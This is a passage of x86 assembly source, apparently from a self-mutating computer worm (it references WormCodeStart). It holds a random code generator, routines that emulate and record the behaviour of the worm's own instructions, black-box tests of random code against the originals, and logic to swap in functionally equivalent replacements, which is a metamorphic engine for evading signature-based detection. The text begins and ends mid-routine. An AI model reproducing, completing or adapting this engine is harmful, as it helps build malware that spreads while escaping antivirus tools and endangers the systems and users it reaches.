		cc rDPF,     cmp,     dl, 0
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x03   ; add Reg32, Mem32
		cc rDPF,     cmp,     dl, 1
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x09   ; or Mem32, Reg32
		cc rDPF,     cmp,     dl, 2
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x0B   ; or Reg32, Mem32
		cc rDPF,     cmp,     dl, 3
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x11   ; adc Mem32, Reg32
		cc rDPF,     cmp,     dl, 4
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x13   ; adc Reg32, Mem32
		cc rDPF,     cmp,     dl, 5
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x19   ; sbb Mem32, Reg32
		cc rDPF,     cmp,     dl, 6
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x1B   ; sbb Reg32, Mem32
		cc rDPF,     cmp,     dl, 7
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x21   ; and Mem32, Reg32
		cc rDPF,     cmp,     dl, 8
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x23   ; and Reg32, Mem32
		cc rDPF,     cmp,     dl, 9
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x29   ; sub Mem32, Reg32
		cc rDPF,     cmp,     dl, 10
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x2B   ; sub Reg32, Mem32
		cc rDPF,     cmp,     dl, 11
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x31   ; xor Mem32, Reg32
		cc rDPF,     cmp,     dl, 12
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x33   ; xor Reg32, Mem32
		cc rDPF,     cmp,     dl, 13
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x39   ; cmp, Mem32, Reg32
		cc rDPF,     cmp,     dl, 14
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x3A   ; cmp, Reg32, Mem32
		cc rDPF,     cmp,     dl, 15
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x87   ; xchg Mem32, Reg32
		cc rDPF,     cmp,     dl, 16
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x89   ; mov, Mem32, Reg32
		cc rDPF,     cmp,     dl, 17
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x8B   ; mov Reg32, Mem32
		cc rDPF,     cmp,     dl, 18
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rNoEmul,  jmp,     EndCRCCycle

	     OPMem32Reg32ESPCheck:
		cc rBDP,     mov,     ebx, 0xBF
		cc rBCDP,    mov,     ecx, 0x0
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rDP,      mov,     byte[RandomCode+ebp+1], dl

		cc rDP,      mov,     dh, dl

		cc rDP,      and,     dh, 111000b
		cc rDPF,     cmp,     dh, 100000b
		cc rNoEmul,  je,      EndCRCCycle		     ; OP esp, ... but source and destination reversed
		cc rNoEmul,  jmp,     OPMem32Reg32ESPCheckOK

	     OPMem32Reg32Cont:
		cc rBDP,     mov,     ebx, 0xBF
		cc rBCDP,    mov,     ecx, 0x0
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rDP,      mov,     byte[RandomCode+ebp+1], dl

		OPMem32Reg32ESPCheckOK:
		cc rNoEmul,  call,    GetRandomNumber

		cc rDP,      and,     dl, 11000111b
		cc rDPF,     cmp,     dl, 00000100b
		cc rNoEmul,  je,      OPMem32Reg32_3byte
		cc rDPF,     cmp,     dl, 00000101b
		cc rNoEmul,  je,      OPMem32Reg32_6byte
		cc rDPF,     cmp,     dl, 0x40
		cc rNoEmul,  jb,      OPMem32Reg32_2byte
		cc rDPF,     cmp,     dl, 01000100b
		cc rNoEmul,  je,      OPMem32Reg32_4byte
		cc rDPF,     cmp,     dl, 0x80
		cc rNoEmul,  jb,      OPMem32Reg32_3byte
		cc rDPF,     cmp,     dl, 10000100b
		cc rNoEmul,  je,      OPMem32Reg32_7byte
		cc rNoEmul,  jmp,     OPMem32Reg32_6byte

	     OPMem32Reg32_3byte:
		cc rDPF,     cmp,     ebp, (RandomCodeBufferSize-3)
		cc rNoEmul,  jg,      EndCRCCycle
		cc rDP,      mov,     edx, dword[RandomNumber]
		cc rP,	     mov,     byte[RandomCode+ebp+2], dl
		cc rP,	     add,     ebp, 0x1
		cc rNoEmul,  jmp,     EndOPMem32Reg32

	     OPMem32Reg32_4byte:
		cc rDPF,     cmp,     ebp, (RandomCodeBufferSize-4)
		cc rNoEmul,  jg,      EndCRCCycle
		cc rDP,      mov,     edx, dword[RandomNumber]
		cc rP,	     mov,     word[RandomCode+ebp+2], dx
		cc rP,	     add,     ebp, 0x2
		cc rNoEmul,  jmp,     EndOPMem32Reg32

	     OPMem32Reg32_6byte:
		cc rDPF,     cmp,     ebp, (RandomCodeBufferSize-6)
		cc rNoEmul,  jg,      EndCRCCycle
		cc rDP,      mov,     edx, dword[RandomNumber]
		cc rP,	     mov,     dword[RandomCode+ebp+2], edx
		cc rP,	     add,     ebp, 0x4
		cc rNoEmul,  jmp,     EndOPMem32Reg32

	     OPMem32Reg32_7byte:
		cc rDPF,     cmp,     ebp, (RandomCodeBufferSize-7)
		cc rNoEmul,  jg,      EndCRCCycle
		cc rDP,      mov,     edx, dword[RandomNumber]
		cc rP,	     mov,     dword[RandomCode+ebp+2], edx
		cc rNoEmul,  call,    GetRandomNumber
		cc rDP,      mov,     dl, byte[RandomNumber]
		cc rP,	     mov,     byte[RandomCode+ebp+6], dl
		cc rP,	     add,     ebp, 0x5
		cc rNoEmul,  jmp,     EndOPMem32Reg32

	     OPMem32Reg32_2byte:
	     EndOPMem32Reg32:
		cc rP,	     add,     ebp, 0x2
	   cc rNoEmul,	jmp,  EndCRCCycle
	   OPMem32Reg32End:


	   PushPopReg32:
		cc rAPF,     cmp,     al, 9
		cc rNoEmul,  jne,     PushPopReg32End

		cc rBP,      mov,     ebx, 0x10
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rBDF,     cmp,     dl, 0x0C		      ; 0x5C=pop esp
		cc rNoEmul,  jne,     PushPopReg32FinAdd
		PushPopReg32Xor:
		cc rDP,      xor,     dl, dl		      ; 0x50=push eax
		PushPopReg32FinAdd:
		cc rCDP,     mov,     cl, byte[CGPushPop]

		cc rCDPF,    cmp,     dl, 8
		cc rNoEmul,  jb,      PushPop32GotPush
		cc rCDP,     dec,     cl
		cc rNoEmul,  jmp,     PushPop32GotPopAlreadys
		PushPop32GotPush:
		cc rCDPF,    cmp,     cl, 0
		cc rNoEmul,  js,      PushPop32GotPopAlreadys
		cc rCDP,     inc,     cl
		PushPop32GotPopAlreadys:
		cc rCDP,     mov,      byte[CGPushPop], cl
		cc rDP,      add,     dl, 0x50
		cc rP,	     mov,     byte[RandomCode+ebp], dl
		cc rP,	     add,     ebp, 0x1
	   cc rNoEmul,	jmp,  EndCRCCycle
	   PushPopReg32End:


	   PushImm321:
		cc rAPF,     cmp,     al, 10
		cc rNoEmul,  jne,     PushImm321End
		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-5)
		cc rNoEmul,  jg,      EndCRCCycle

		cc rDP,      mov,     dl, 0x68
		cc rP,	     mov,     byte[RandomCode+ebp], dl

		cc rNoEmul,  call,    GetRandomNumber
		cc rP,	     mov,     dword[RandomCode+ebp+1], edx
		cc rP,	     add,     ebp, 0x5
	   cc rNoEmul,	jmp,  EndCRCCycle
	   PushImm321End:

	   PushImm322:
		cc rAPF,     cmp,     al, 11
		cc rNoEmul,  jne,     PushImm322End
		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-2)
		cc rNoEmul,  jg,      EndCRCCycle

		cc rDP,      mov,     dl, 0x6A
		cc rP,	     mov,     byte[RandomCode+ebp], dl

		cc rNoEmul,  call,    GetRandomNumber
		cc rP,	     mov,     byte[RandomCode+ebp+1], dl
		cc rP,	     add,     ebp, 0x2
	   cc rNoEmul,	jmp,  EndCRCCycle
	   PushImm322End:


	   IncDec32:
		cc rAPF,     cmp,     al, 12
		cc rNoEmul,  jne,     IncDec32End

		cc rBP,      mov,     ebx, 0x10
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rDP,      add,     dl, 0x40
		cc rP,	     mov,     byte[RandomCode+ebp], dl
		cc rP,	     add,     ebp, 0x1
	   cc rNoEmul,	jmp,  EndCRCCycle
	   IncDec32End:


	   EndCRCCycle:

		cc rPF,      cmp,     ebp, RandomCodeBufferSize
    cc rNoEmul,  jb, CreateMoreRandomCode
		cc rA,	     mov,     eax, 0x90909090
		cc rA,	     mov,     dword[RC_Padding], eax
		cc rNoRes,   mov,     dword[RC_Padding+4], eax

cc rNoEmul,  ret


; #####
; #####   Random Code Generator
; #####
; ###########################################################################
; ###########################################################################



; ###########################################################################
; ###########################################################################
; #####
; #####   Creator of Behaviour Table of own Code
; #####


CreateRandomRegisters:
	cc rS,	     xor,     esi, esi

	CreateRandomRegistersMore:
		cc rBS,      mov,     ebx, (DataEnd-DataStart)+1
		cc rBCS,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rDS,      mov,     dword[rEAX+esi], edx

		cc rS,	    add,     esi, 4
		cc rSF,     cmp,     esi, 7*4
	cc rNoEmul,  jb,      CreateRandomRegistersMore

	cc rB,	     mov,     ebx, 8
	cc rBC,      xor,     ecx, ecx
	cc rNoEmul,  call,    CreateSpecialRndNumber

	cc rA,	    mov,     eax, DataStart
	cc rNoRes,  add,     dword[rEAX+edx*4], eax

		cc rA,	     mov,     eax, dword[rEAX+0x00]
		cc rAB,      mov,     ebx, dword[rEAX+0x04]
		cc rABC,     mov,     ecx, dword[rEAX+0x08]
		cc rABCD,    mov,     edx, dword[rEAX+0x0C]
		cc rABCDP,   mov,     ebp, dword[rEAX+0x10]
		cc rABCDPS,  mov,     esi, dword[rEAX+0x14]
		cc rABCDPSI, mov,     edi, dword[rEAX+0x18]

cc rNoEmul,  ret




PrepareRegistersAndTable:
; In: at dword[tmpAddress]
; Address of BehaviourTable

		cc rA,	     mov,     eax, dword[tmpAddress]

		; initial values are primes between 0x0FFF FFFF - 0xFFFF FFFF
		; except ESP, which is not changed

		cc rAB,      mov,     ebx, dword[rEAX+0x04]
		cc rAB,      mov,     dword[eax+0x04], ebx
		cc rABC,     mov,     ecx, dword[rEAX+0x08]
		cc rABC,     mov,     dword[eax+0x08], ecx
		cc rABCD,    mov,     edx, dword[rEAX+0x0C]
		cc rABCD,    mov,     dword[eax+0x0C], edx
		cc rABCDP,   mov,     ebp, dword[rEAX+0x10]
		cc rABCDP,   mov,     dword[eax+0x10], ebp
		cc rABCDPS,  mov,     esi, dword[rEAX+0x14]
		cc rABCDPS,  mov,     dword[eax+0x14], esi
		cc rABCDPSI, mov,     edi, dword[rEAX+0x18]
		cc rABCDPSI, mov,     dword[eax+0x18], edi

		cc rABCDPSI, push,    ebx
			cc rNoEmul,  pushfd
			cc rABCDPSI, pop,     ebx
			cc rABCDPSI, and,     bl, 10b	      ; FLAGS - all zero except the reserved-1 one
			cc rABCDPSI, push,    ebx
			cc rNoEmul,  popfd		     ; save FLAGS
			cc rABCDPSI, mov,     dword[eax+0x1C], ebx
		cc rABCDPSI, pop,     ebx

		cc rABCDPSI, mov,     dword[eax+0x20], esp

		cc rABCDPSI, push,    ebx
		cc rABCDPSI, mov,     ebx, dword[rEAX+0x00]
		cc rABCDPSI, mov,     dword[eax+0x00], ebx
		cc rABCDPSI, mov,     eax, ebx
		cc rABCDPSI, pop,     ebx

cc rNoEmul,  ret


AnalyseBehaviourOfCode:
; In: at dword[tmpAddress]
; Address of BehaviourTable

	  cc rABCDPSIF, push,  ebx
	  cc rABCDPSIF, mov,   ebx, eax
	  cc rNoEmul,	pushfd

	  cc rABCDPSI,	mov,   eax, dword[hDataMirror]
	  cc rABCDPSIF, cmp,   eax, dword[hDataMirror1]
	  cc rNoEmul,	je,    AnalyseBehaviourOfCodeGoodDataMirror
		cc rAC,     xor,     eax, eax	     ; This value can not be restored, as otherwise the
						     ; behaviour table gets wrong entries. So just make an
						     ; exception and run next random code.
		cc rNoRes,  mov,     byte[eax], cl
	  AnalyseBehaviourOfCodeGoodDataMirror:

	  cc rABCDPSI,	mov,   eax, dword[hTempAlloc1]
	  cc rABCDPSIF, cmp,   eax, dword[hTempAlloc1]
	  cc rNoEmul,	je,    AnalyseBehaviourOfCodeGoodVirtualAlloc
		cc rAC,     xor,     eax, eax			 ; This value can not be restored, too
		cc rNoRes,  mov,     byte[eax], cl
	  AnalyseBehaviourOfCodeGoodVirtualAlloc:

	  cc rABCDPSI,	mov,   eax, dword[hRandomizedData]
	  cc rABCDPSIF, cmp,   eax, dword[hRandomizedData1]
	  cc rNoEmul,	je,    AnalyseBehaviourOfCodeGoodRandomizedData
		cc rAC,     xor,     eax, eax			 ; This value can not be restored, too
		cc rNoRes,  mov,     byte[eax], cl
	  AnalyseBehaviourOfCodeGoodRandomizedData:

	  cc rABCDPSI, mov,   eax, dword[tmpAddress] ; The random code could have changed
						     ; the dword[tmpAddress], so to make sure
						     ; that the address is right, we can compare
						     ; with two other places where the same value
						     ; should be. Noisy channel + self-repair :)
	  cc rABCDPSIF, cmp,   eax, dword[tmpAddress1]
	  cc rNoEmul,	je,    AnalyseBehaviourOfCodeGoodAddress
		cc rABCDPSI, mov,     eax, dword[tmpAddress2]
	  AnalyseBehaviourOfCodeGoodAddress:

		cc rNoEmul,  pushad
						; Temporary Alloced Memory, because it can't be written
						; To .data or hDataMirror as they must stay unchanged for comparing

			cc rAP,      mov,     ebp, dword[hTempAlloc1]	     ; ebp=Temp.VirtualAlloc
			cc rAP,      push,    ebp	      ; Save Temp.VirtualAlloc

			cc rACP,    xor,     ecx, ecx
			Zer0TheTempMemory:
				cc rACP,    mov,     dword[ebp+ecx], 0x0
				cc rACP,    add,     ecx, 0x4
				cc rACPF,   cmp,     ecx, 2*4*4
			cc rNoEmul,  jb,      Zer0TheTempMemory

			cc rACP,     xor,     ecx, ecx	      ; Counter
			cc rACPS,    mov,     esi, dword[hRandomizedData]
			cc rACPSI,   mov,     edi, DataStart


		  CompareMirrorMemAgain:
			cc rACDPSI,  mov,     edx, dword[edi+ecx]
			cc rABCDPSI, mov,     ebx, dword[esi+ecx]

			cc rABCDPSIF,cmp,     edx, ebx
			cc rNoEmul,  je,      CompareMirrorMemNoDifference

			; Found difference!
			; Write it to qword[ebp]
			cc rACDPSI,  mov,     dword[ebp], ecx		; Relative offset of difference
			cc rACPSI,   mov,     dword[ebp+4], edx 	; different dword

			cc rACPSI,   add,     ebp, 8			; Point to next entry

		      CompareMirrorMemNoDifference:
			cc rACPSI,   add,     ecx, 0x4
			cc rACPSIF,  cmp,     ecx, (DataEnd-DataStart)
		  cc rNoEmul,  jb,  CompareMirrorMemAgain

			cc rACPSI,   pop,     esi	 ; temp.VirtualAlloc

			cc rNoEmul,  pushad
			cc rNoEmul,  call,    RestoreTheMemory
			cc rNoEmul,  popad

						; eax=dword[tmpAddress]
			cc rAS,    add,     eax, 9*4	    ; eax ... pointer to MemoryPart of Behaviour Table
			cc rSI,    mov,     edi, eax	    ; Pointer to BehaviourTable
			cc rCSI,   xor,     ecx, ecx
		     AnalyseBehaviourOfCodeWriteMore:
			cc rACSI,  mov,     eax, dword[esi]
			cc rCSI,   mov,     dword[edi], eax
			cc rCSI,   add,     esi, 0x4
			cc rCSI,   add,     edi, 0x4
			cc rCSI,   add,     ecx, 0x4

			cc rCSIF,  cmp,     ecx, 2*4*4
		     cc rNoEmul,  jb, AnalyseBehaviourOfCodeWriteMore	 ; Temp-Memory to BehaviourTable

		cc rNoEmul,  popad
	  cc rNoEmul,  popfd

	  cc rABCDPSIF, push,  ecx    ; temp. save
		cc rNoEmul, pushfd
		cc rABCDPSI, pop, ecx	  ; ECX=Flags
		cc rABCDPSI, sub,   dword[eax+0x1C], ecx    ; save FLAGS-difference
	  cc rABCDPSI, pop,   ecx			     ; restore original ecx

	  cc rABCDPSI, sub,   dword[eax+0x00], ebx    ; EAX (saved as EBX temporarily)
	  cc rABCDPSI, pop,   ebx		      ; restore original ebx

	  cc rACDPSI, sub,   dword[eax+0x04], ebx
	  cc rADPSI,  sub,   dword[eax+0x08], ecx
	  cc rABSI,   sub,   dword[eax+0x0C], edx
	  cc rASI,    sub,   dword[eax+0x10], ebp
	  cc rAI,     sub,   dword[eax+0x14], esi
	  cc rA,      sub,   dword[eax+0x18], edi

	  cc rAB,     mov,   ebx, dword[eax+0x20]    ; ebx=old ESP
	  cc rAB,     sub,   dword[eax+0x20], esp

	  cc rABC,    pop,   ecx		     ; ecx=current return-address
	  cc rABCD,   xor,   edx, edx
	  cc rABC,    mov,   dword[eax+0x44], edx

	  cc rABCF,    cmp,  dword[eax+0x20], +4	     ; has there been a PUSH?
	  cc rNoEmul,  jne,  AnalyseBehaviourOfCodeRestoreESP
	  cc rBC,      pop,  dword[eax+0x44]			 ; Save the offset at the stack

	  AnalyseBehaviourOfCodeRestoreESP:
	  cc rBC,  add,   ebx, 4      ; because of the "pop ecx" above
	  cc rNoEmul, mov,   esp, ebx

	  cc rC,   pop,   ebx ; trash 1
	  cc rC,   pop,   ebx ; trash 2
	  cc rC,   pop,   ebx ; trash 3
	  cc rC,   pop,   ebx ; trash 4
	  cc rC,   pop,   ebx ; trash 5
	  cc rC,   pop,   ebx ; trash 6
	  cc rC,   pop,   ebx ; trash 7
	  cc rC,   pop,   ebx ; trash 8
	  cc rC,   push,  dword[tmpDW8]
	  cc rC,   push,  dword[tmpDW7]
	  cc rC,   push,  dword[tmpDW6]
	  cc rC,   push,  dword[tmpDW5]
	  cc rC,   push,  dword[tmpDW4]
	  cc rC,   push,  dword[tmpDW3]
	  cc rC,   push,  dword[tmpDW2]
	  cc rC,   push,  dword[tmpDW1]

	  cc rNoRes, push,  ecx
cc rNoEmul,  ret



MakeBehaviourTableOfOwnCode:
       cc rNoRes,  push,    PAGE_READWRITE
       cc rNoRes,  push,    MEM_COMMIT
       cc rNoRes,  push,    CommandNumber*BehaviourTableSize
       cc rNoRes,  push,    0x0
       cc rNoEmul, stdcall, dword[_VirtualAlloc]     ; For the LocalBehaviourTable of all file's commands
       cc rNoRes,  mov,     dword[hLBTFileCode], eax

       cc rC,	   xor,     ecx, ecx	    ; Counter

     AnalyseNextCommand:
	cc rAC,      mov,     eax, GlobalBehaviourTable
	cc rAC,      add,     eax, ecx
	cc rAC,      mov,     al, byte[eax]
	cc rCF,      cmp,     al, rNoEmul
	cc rNoEmul,  je,      MakeBTNoEmul

	cc rAC,      mov,     eax, dword[WormCodeStart]
	cc rAC,      push,    dword[ecx*8+eax+0x00]
	cc rAC,      pop,     dword[BufferForCode+0x00]

	cc rAC,      push,    dword[ecx*8+eax+0x04]
	cc rAC,      pop,     dword[BufferForCode+0x04]

	cc rAC,      mov,     eax, dword[BufferForCode+0x00]
	cc rABC,     mov,     ebx, dword[BufferForCode+0x04]


	cc rNoEmul,  pushad
		cc rABCD,    xor,     edx, edx
		cc rABD,     mov,     eax, ecx
		cc rABD,     mov,     ebx, BehaviourTableSize
		cc rABD,     mul,     ebx
		cc rABD,     add,     eax, dword[hLBTFileCode]
		cc rAB,      mov,     dword[tmpAddress], eax
		cc rAB,      mov,     dword[tmpAddress1], eax
		cc rAB,      mov,     dword[tmpAddress2], eax

		VEH_TRY FC1

		cc rA,	     xor,     eax, eax
		cc rAB,      mov,     ebx, FileCodeExection
		cc rNoEmul,  call,    GenerateExecuteableCodeInMemory
		cc rNoEmul,  call,    dword[hExecutionMirror]

		VEH_EXCEPTION FC1

		VEH_END FC1
	cc rNoEmul,  popad

	MakeBTNoEmul:
	cc rABC,     inc,     ecx
	cc rABCF,    cmp,     ecx, CommandNumber
	cc rNoEmul,  jb,      AnalyseNextCommand

	cc rNoRes,  push,    tmpMemProtection
	cc rNoRes,  push,    PAGE_READONLY
	cc rNoRes,  push,    CommandNumber*BehaviourTableSize
	cc rNoRes,  push,    dword[hLBTFileCode]
	cc rNoEmul, stdcall, dword[_VirtualProtect]	      ; Read only for LBT from now on...

cc rNoEmul,  ret

; #####
; #####   Creator of Behaviour Table of own Code
; #####
; ###########################################################################
; ###########################################################################



; ###########################################################################
; ###########################################################################
; #####
; #####   Compare the Behaviour Tables of the file code
; #####   with the random code
; #####


CompareCodeBTwithRandomBT:

		cc rNoEmul,  call,    GetGoodRandomNumber     ; its important where the search-procedure starts
		cc rC,	     xor,     ecx, ecx
		cc rBC,      mov,     ebx, CommandNumber-2
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rD,	     mov,     dword[RndNumCycle], edx
		cc rCD,      xor,     ecx, ecx		 ; Command Counter
		cc rC,	     add,     ecx, edx

	CompareNextTable:
		cc rAC,      mov,     al, byte[GlobalBehaviourTable+ecx]  ; Get the GlobalBT (1 byte) for
							    ; the current command
		cc rACF,     cmp,     al, rNoEmul
		cc rNoEmul,  je,      NotFoundEqualTables

		cc rCD,      xor,     edx, edx
		cc rACD,     mov,     eax, BehaviourTableSize
		cc rAC,      mul,     ecx	 ; eax=edx:eax * ecx = BehaviourTableSize*ecx
		cc rCS,      mov,     esi, eax
		cc rCS,      add,     esi, dword[hLBTFileCode]


		cc rCDS,     xor,     edx, edx		 ; Byte Counter in Table
	   CompareNextByte:
		    ; esi = BehaviourTable (file code) -> eax
		    ; edi = TempBehaviourTable (random code) -> ebx

		    cc rCDSF,	 cmp,  edx, 8
		cc rNoEmul,	 jge, CompareNoException

		    cc rACDS,	  mov,	   al, byte[GlobalBehaviourTable+ecx]  ; Get the GlobalBT (1 byte) for
								; the current command

		    cc rACDS,	  mov,	   ah, 1	      ; ah = 1
		    cc rACDS,	  xchg,    cl, dl	      ; change
		    cc rACDS,	  shl,	   ah, cl	      ;
		    cc rACDS,	  xchg,    cl, dl	      ; Back
					       ; al = GBT
					       ; ah = 1 shl dl

		    cc rACDSF,	  and,	   al, ah
		cc rNoEmul,	  jz,  NoNeedForComparing

		CompareNoException:
		    cc rACDS,	  mov,	   eax, dword[esi+edx*4]		; esi = BehaviourTable (file code) -> eax
		    cc rABCDS,	  mov,	   ebx, dword[TempBehaviourTable+edx*4] ;     = TempBehaviourTable (random code) -> ebx
		    cc rABCDSF,   cmp,	   eax, ebx
		    cc rNoEmul,   jne,	   NotFoundEqualTables

	     NoNeedForComparing:
		cc rACDS,     inc,     edx
		cc rACDSF,    cmp,     edx, BehaviourTableSize/4

	   cc rNoEmul,	jb,   CompareNextByte

		cc rACDS,      mov,	al, byte[CGPushPop]
		cc rACDSF,     cmp,	al, 0x0
		cc rNoEmul,    jns,	CompareFoundNoPopProblem

		cc rACDS,      mov,	eax, dword[TempBehaviourTable+8*4]  ; ESP
		cc rACDSF,     cmp,	eax, -4
		cc rNoEmul,    jne,	NotFoundEqualTables		    ; ESP!=-4 && POP zuerst -> PROBLEM!!!

		CompareFoundNoPopProblem:

		cc rACDSI,     mov,	edi, BufferForCode
		cc rABCDSI,    mov,	ebx, dword[WormCodeStart]
		cc rABCDSI,    mov,	eax, dword[ecx*8+ebx]
		cc rABCDSI,    mov,	dword[edi], eax
		cc rABCDSI,    mov,	eax, dword[ecx*8+ebx+4]
		cc rACDSI,     mov,	dword[edi+4], eax

		cc rACDS,      mov,	al, byte[GlobalBehaviourTable+ecx]
		cc rACDS,      mov,	byte[tmpGBT], al
		cc rNoEmul,    call,	BlackBoxTesting
		cc rACDSF,     cmp,	eax, 0x0
		cc rNoEmul,    je,	SubstituteCommand
		cc rNoEmul,    jmp,	NotFoundEqualTables


	   NotFoundEqualTables:

		cc rACDS,     inc,     ecx
		cc rACDSF,    cmp,     ecx, CommandNumber
		cc rNoEmul,   jne,     CreateSpecialRndNumberNotZero
		cc rACDS,     xor,     ecx, ecx
		CreateSpecialRndNumberNotZero:

		cc rACDS,     mov,     edx, dword[RndNumCycle]
		cc rACDSF,    cmp,     edx, ecx
	cc rNoEmul,   jne,     CompareNextTable

		SubstituteCommandEnd:
cc rNoEmul, ret

; #####
; #####   Compare the Behaviour Tables of the file code
; #####   with the random code
; #####
; ###########################################################################
; ###########################################################################



; ###########################################################################
; ###########################################################################
; #####
; #####   BlackBox Testing
; #####   Send in different parameters and compare output
; #####

;BBFoundEqualCode db "FOUND EQUAL CODE!",0x0
;BBNoEqualCode    db "no success",0x0

BlackBoxTesting:
		cc rNoEmul,  pushad

		cc rC,	     xor,     ecx, ecx
		cc rC,	     mov,     byte[BBExceptionCount], cl	      ; If problems occure with the random values of
								; Mem8/32 operations, we use the original values of the primary test
		cc rNoRes,   push,    ecx	   ; BB Counter

	PerformeAnotherBlackBoxTest:
		cc rNoEmul,  call,    GetRandomNumber

		cc rA,	     mov,     eax, CodeExecDifference
		cc rAB,      mov,     ebx, FileCodeExection
		cc rNoEmul,  call,    GenerateExecuteableCodeInMemory

		cc rA,	     mov,     eax, BBTableFileCode
		cc rA,	     mov,     dword[tmpAddress], eax
		cc rA,	     mov,     dword[tmpAddress1], eax
		cc rNoRes,   mov,     dword[tmpAddress2], eax

		VEH_TRY FC2

		cc rA,	     mov,     al, byte[tmpGBT]
		cc rF,	     and,     al, 10000000b		   ; FLAGS?
		cc rNoEmul,  jz,      BBTestPrePareNoFlags	   ; If Flags are restricted, use very small numbers sometimes.
		cc rB,	     mov,     ebx, 3
		cc rBC,      xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rF,	     cmp,     dl, 0
		cc rNoEmul,  je,      BBTestPrePareNoFlags

		cc rNoEmul,  call,    CreateRandomRegisters

		cc rABCDPSI, mov,     dword[BBTableFileCode+0x00], eax
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x00], eax
		cc rABCDPSI, mov,     dword[BBTableFileCode+0x04], ebx
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x04], ebx
		cc rABCDPSI, mov,     dword[BBTableFileCode+0x08], ecx
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x08], ecx
		cc rABCDPSI, mov,     dword[BBTableFileCode+0x0C], edx
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x0C], edx
		cc rABCDPSI, mov,     dword[BBTableFileCode+0x10], ebp
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x10], ebp
		cc rABCDPSI, mov,     dword[BBTableFileCode+0x14], esi
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x14], esi
		cc rABCDPSI, mov,     dword[BBTableFileCode+0x18], edi
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x18], edi
		cc rNoEmul,  jmp,     BBTestOverRandomRegisterCreation
		BBTestPrePareNoFlags:


	   ; Prepare Registers and BehaviourTables
		cc rNoEmul,  call,    GetGoodRandomNumber
		cc rA,	     mov,     eax, dword[RandomNumber]
		cc rA,	     mov,     dword[BBTableFileCode+0x00], eax
		cc rA,	     mov,     dword[BBTableRandomCode+0x00], eax

		cc rNoEmul,  call,    GetGoodRandomNumber
		cc rAB,      mov,     ebx, dword[RandomNumber]
		cc rAB,      mov,     dword[BBTableFileCode+0x04], ebx
		cc rAB,      mov,     dword[BBTableRandomCode+0x04], ebx

		cc rNoEmul,  call,    GetGoodRandomNumber
		cc rABC,     mov,     ecx, dword[RandomNumber]
		cc rABC,     mov,     dword[BBTableFileCode+0x08], ecx
		cc rABC,     mov,     dword[BBTableRandomCode+0x08], ecx

		cc rNoEmul,  call,    GetGoodRandomNumber
		cc rABCD,    mov,     edx, dword[RandomNumber]
		cc rABCD,    mov,     dword[BBTableFileCode+0x0C], edx
		cc rABCD,    mov,     dword[BBTableRandomCode+0x0C], edx

		cc rNoEmul,  call,    GetGoodRandomNumber
		cc rABCDP,   mov,     ebp, dword[RandomNumber]
		cc rABCDP,   mov,     dword[BBTableFileCode+0x10], ebp
		cc rABCDP,   mov,     dword[BBTableRandomCode+0x10], ebp

		cc rNoEmul,  call,    GetGoodRandomNumber
		cc rABCDPS,  mov,     esi, dword[RandomNumber]
		cc rABCDPS,  mov,     dword[BBTableFileCode+0x14], esi
		cc rABCDPS,  mov,     dword[BBTableRandomCode+0x14], esi

		cc rNoEmul,  call,    GetGoodRandomNumber
		cc rABCDPSI, mov,     edi, dword[RandomNumber]
		cc rABCDPSI, mov,     dword[BBTableFileCode+0x18], edi
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x18], edi

		BBTestOverRandomRegisterCreation:
		cc rABCDPSI, mov,     dword[BBTableFileCode+0x20], esp
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x20], esp

		cc rABCDPSI, sub,     dword[BBTableFileCode+0x20], 0x08      ; esp is esp+8 here because of
